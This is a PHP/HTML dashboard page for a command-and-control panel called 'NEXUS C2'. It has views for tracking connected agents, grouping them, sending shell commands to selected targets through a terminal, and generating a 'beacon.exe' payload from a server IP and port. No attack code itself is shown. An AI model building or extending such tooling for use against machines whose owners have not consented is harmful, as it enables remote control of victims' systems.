<?php
require_once __DIR__ . '/includes/auth_middleware.php';
session_start();
requireAuth();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS C2 - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="app-container">
        <aside class="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-logo"><span>N</span></div>
            </div>
            <nav class="sidebar-nav">
                <a href="#" class="nav-item active" data-view="dashboard" title="Dashboard">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/>
                        <rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/>
                    </svg>
                </a>
                <a href="#" class="nav-item" data-view="agents" title="Agents">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="4" y="4" width="16" height="16" rx="2"/>
                        <path d="M9 9h6M9 12h6M9 15h4"/>
                    </svg>
                </a>
                <a href="#" class="nav-item" data-view="groups" title="Groups">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                        <circle cx="9" cy="7" r="4"/>
                        <path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/>
                    </svg>
                </a>
                <a href="#" class="nav-item" data-view="terminal" title="Terminal">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
                    </svg>
                </a>
                <a href="#" class="nav-item" data-view="payload" title="Payload">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                        <polyline points="7 10 12 15 17 10"/>
                        <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                </a>
            </nav>
            <div class="sidebar-footer">

                <div class="connection-status" id="connectionStatus" title="Disconnected"></div>
                <a href="#" id="logoutBtn" class="nav-item" title="Logout">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
                        <polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/>
                    </svg>
                </a>
            </div>
        </aside>
        
        <main class="main-content">
            <header class="top-bar">
                <div class="page-title">
                    <h1 id="viewTitle">Dashboard</h1>
                </div>
                <div class="topbar-credit">MADE BY @IMAD</div>
            </header>
            
            <div class="content-area">
                <div id="dashboardView" class="view active">
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-icon online">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>
                                </svg>
                            </div>
                            <div class="stat-info">
                                <span class="stat-value" id="onlineCount">0</span>
                                <span class="stat-label">Online</span>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon offline">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
                                </svg>
                            </div>
                            <div class="stat-info">
                                <span class="stat-value" id="offlineCount">0</span>
                                <span class="stat-label">Offline</span>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon groups">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                                    <circle cx="9" cy="7" r="4"/>
                                </svg>
                            </div>
                            <div class="stat-info">
                                <span class="stat-value" id="groupCount">0</span>
                                <span class="stat-label">Groups</span>
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-icon commands">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
                                </svg>
                            </div>
                            <div class="stat-info">
                                <span class="stat-value" id="commandCount">0</span>
                                <span class="stat-label">Commands</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="dashboard-grid">
                        <div class="card">
                            <div class="card-header">
                                <h3>Recent Agents</h3>
                            </div>
                            <div class="card-body">
                                <div class="agent-list" id="recentAgentsList"></div>
                            </div>
                        </div>
                        <div class="card">
                            <div class="card-header">
                                <h3>Quick Command</h3>
                            </div>
                            <div class="card-body">
                                <div class="quick-command">
                                    <select id="quickTarget" class="select-input">
                                        <option value="">Select Target</option>
                                    </select>
                                    <div class="command-input-group">
                                        <input type="text" id="quickCommand" class="text-input" placeholder="Enter command...">
                                        <button id="quickSendBtn" class="btn-primary">Send</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div id="agentsView" class="view">
                    <div class="view-header">
                        <div class="search-box">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
                            </svg>
                            <input type="text" id="agentSearch" placeholder="Search agents...">
                        </div>
                        <div class="server-control">
                            <span class="server-indicator offline" id="serverIndicator"></span>
                            <span class="server-status-text" id="serverStatusText">Offline</span>
                            <div class="server-divider"></div>
                            <button class="btn-server" id="serverStopBtn" onclick="app.stopServer()" title="Stop">
                                <svg viewBox="0 0 24 24" fill="currentColor" stroke="none">
                                    <rect x="6" y="6" width="12" height="12"/>
                                </svg>
                                <span>Stop</span>
                            </button>
                            <button class="btn-server" id="serverRestartBtn" onclick="app.restartServer()" title="Restart">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                                    <path d="M23 4v6h-6"/>
                                    <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
                                </svg>
                                <span>Restart</span>
                            </button>
                        </div>
                    </div>
                    <div class="agents-table-container">
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>Status</th>
                                    <th>Hostname</th>
                                    <th>IP</th>
                                    <th>OS</th>
                                    <th>User</th>
                                    <th>Group</th>
                                    <th>Last Seen</th>
                                    <th></th>
                                </tr>
                            </thead>
                            <tbody id="agentsTableBody"></tbody>
                        </table>
                    </div>
                </div>
                
                <div id="groupsView" class="view">
                    <div class="groups-layout">
                        <div class="groups-list-panel">
                            <div class="view-header">
                                <button id="createGroupBtn" class="btn-primary">+ Create Group</button>
                            </div>
                            <div class="groups-label">Available Groups</div>
                            <div class="groups-grid" id="groupsGrid"></div>
                        </div>
                        <div class="group-detail-panel" id="groupDetailPanel">
                            <div class="group-detail-header">
                                <h3 id="groupDetailName">Select a Group</h3>
                                <div class="group-detail-actions">
                                    <button class="btn-ghost" onclick="app.toggleGroupMaximize()" id="maximizeGroupBtn">
                                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                            <polyline points="15 3 21 3 21 9"></polyline>
                                            <polyline points="9 21 3 21 3 15"></polyline>
                                            <line x1="21" y1="3" x2="14" y2="10"></line>
                                            <line x1="3" y1="21" x2="10" y2="14"></line>
                                        </svg>
                                    </button>
                                </div>
                            </div>
                            <div class="group-detail-body">
                                <div class="group-empty-state" id="groupEmptyState">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                                        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                                        <circle cx="9" cy="7" r="4"/>
                                        <path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/>
                                    </svg>
                                    <p>No group selected</p>
                                    <span>Select a group from the list to view details</span>
                                </div>
                                <div class="group-content" id="groupContent" style="display: none;">
                                    <div class="group-agents-section">
                                        <h4>Agents in Group</h4>
                                        <div class="group-agents-list" id="groupAgentsList"></div>
                                        <div class="add-agent-dropdown">
                                            <select id="addAgentToGroup" class="select-input">
                                                <option value="">+ Add Agent...</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="group-command-section">
                                        <h4>Execute Command on Group</h4>
                                        <div class="command-input-group">
                                            <input type="text" id="groupCommandInput" class="text-input" placeholder="Enter command...">
                                            <button class="btn-primary" onclick="app.sendGroupCommand()">Send</button>
                                        </div>
                                        <div class="group-command-output" id="groupCommandOutput"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div id="terminalView" class="view">
                    <div class="terminal-container">
                        <div class="terminal-header">
                            <span class="terminal-title">Terminal</span>
                            <div class="terminal-target">
                                <div class="custom-select" id="terminalTargetDropdown">
                                    <div class="custom-select-trigger" id="terminalTargetTrigger">
                                        <span>Select Target</span>
                                        <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2">
                                            <polyline points="6 9 12 15 18 9"/>
                                        </svg>
                                    </div>
                                    <div class="custom-select-options" id="terminalTargetOptions"></div>
                                    <input type="hidden" id="terminalTarget" value="">
                                </div>
                            </div>
                            <button id="clearTerminal" class="btn-ghost">Clear</button>
                        </div>
                        <div class="terminal-output" id="terminalOutput"></div>
                        <div class="terminal-input-line">
                            <span class="prompt">$</span>
                            <input type="text" id="terminalInput" placeholder="Enter command..." autocomplete="off">
                        </div>
                    </div>
                </div>
                
                <div id="payloadView" class="view">
                    <div class="payload-layout">
                        <div class="payload-left">
                            <div class="card">
                                <div class="card-header">
                                    <h3>Generate Beacon</h3>
                                </div>
                                <div class="card-body">
                                    <div class="payload-form">
                                        <div class="form-group">
                                            <label>Server IP</label>
                                            <input type="text" id="payloadIp" class="text-input" value="<?php echo $_SERVER['SERVER_ADDR'] ?? '127.0.0.1'; ?>">
                                        </div>
                                        <div class="form-group">
                                            <label>Port</label>
                                            <input type="text" id="payloadPort" class="text-input" value="8080">
                                        </div>
                                        <button class="btn-primary btn-generate" id="buildBtn" onclick="app.buildPayload()">
                                            Generate beacon.exe
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <div class="card build-status-card">
                                <div class="card-body">
                                    <div class="build-status" id="buildStatus">
                                        <span class="status-idle">No active build</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="payload-right">
                            <div class="card">
                                <div class="card-header">
                                    <h3>Generated Beacons</h3>
                                </div>
                                <div class="card-body">
                                    <div class="beacon-list" id="beaconList"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
    
    <div id="modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modalTitle">Modal</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body" id="modalBody"></div>
        </div>
    </div>
    
    <script src="assets/js/websocket.js"></script>
    <script src="assets/js/dashboard.js"></script>
</body>
</html>
